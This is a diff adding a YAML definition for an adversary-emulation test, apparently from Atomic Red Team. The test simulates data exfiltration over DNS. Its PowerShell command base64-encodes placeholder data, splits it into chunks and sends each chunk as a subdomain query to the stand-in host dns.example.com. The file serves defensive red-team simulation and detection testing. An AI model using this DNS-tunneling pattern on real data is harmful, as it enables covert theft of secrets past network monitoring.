@@ -1,0 +1,44 @@
+- id: c9207f3e-213d-4cc7-ad2a-7697a7237df9
+  name: Text Based Data Exfiltration using DNS subdomains
+  description: Simulates an adversary using DNS tunneling to exfiltrate data over
+    a Command and Control (C2) channel.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: $dnsServer = "dns.example.com"; $exfiltratedData = "SecretDataToExfiltrate";
+          $chunkSize = 63; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData);
+          $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData
+          -split "(.{$chunkSize})"; foreach ($chunk in $chunks) {; $dnsQuery = $chunk
+          + "." + $dnsServer; Resolve-DnsName -Name $dnsQuery; Start-Sleep -Seconds
+          5; }
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - exfiltration
+  - atomic-red-team
+  - t1041
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      dns_server:
+        description: DNS server IP address or domain name.
+        type: url
+        default: dns.example.com
+      exfiltrated_data:
+        description: Data to be exfiltrated.
+        type: string
+        default: SecretDataToExfiltrate
+      chunk_size:
+        description: Size of each DNS query chunk (in characters).
+        type: integer
+        default: 63
+    technique_created: '2017-05-31T21:30:41.804Z'
+    atomic_guid: c9207f3e-213d-4cc7-ad2a-7697a7237df9
+    import_timestamp: '2025-06-24T11:15:07.905454Z'
